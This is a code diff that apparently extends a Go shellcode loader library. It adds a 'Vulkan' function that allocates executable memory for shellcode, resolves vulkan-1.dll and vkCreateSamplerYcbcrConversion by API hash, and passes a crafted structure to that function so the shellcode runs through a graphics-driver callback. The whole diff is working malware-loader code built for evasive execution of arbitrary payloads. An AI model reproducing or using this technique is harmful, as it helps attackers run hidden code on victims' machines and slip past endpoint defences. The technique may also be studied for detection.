@@ -155,3 +155,32 @@ func LineDDA(shellcode []byte) error {
 
 	return nil
 }
+
+func Vulkan(shellcode []byte) error {
+	baseAddress, err := allocateRX(shellcode)
+	if err != nil {
+		return fmt.Errorf("alloc RX failed: %v", err)
+	}
+	const CHECKSUM = 0x10ADED040410ADED
+
+	type EG_STR struct {
+		V1    uint64
+		Table [256]uint64
+	}
+	mb := wc.GetModuleBase(wc.GetHash("vulkan-1.dll"))
+	if mb == 0 {
+		mb = wc.LoadLibraryLdr("vulkan-1.dll")
+	}
+	fmt.Printf("vulkan-1.dll found at: 0x00%x\n", mb)
+	funcaddr := wc.GetFunctionAddress(mb, wc.GetHash("vkCreateSamplerYcbcrConversion"))
+	var ex EG_STR
+	ex.Table[0] = CHECKSUM
+	ex.V1 = uint64(uintptr(unsafe.Pointer(&ex.Table[0])))
+	ex.Table[132] = uint64(baseAddress)
+	ret, _, err := wc.CallG0(uintptr(funcaddr), uintptr(unsafe.Pointer(&ex)))
+	if err != nil {
+		fmt.Println(err)
+	}
+	_ = ret
+	return nil
+}
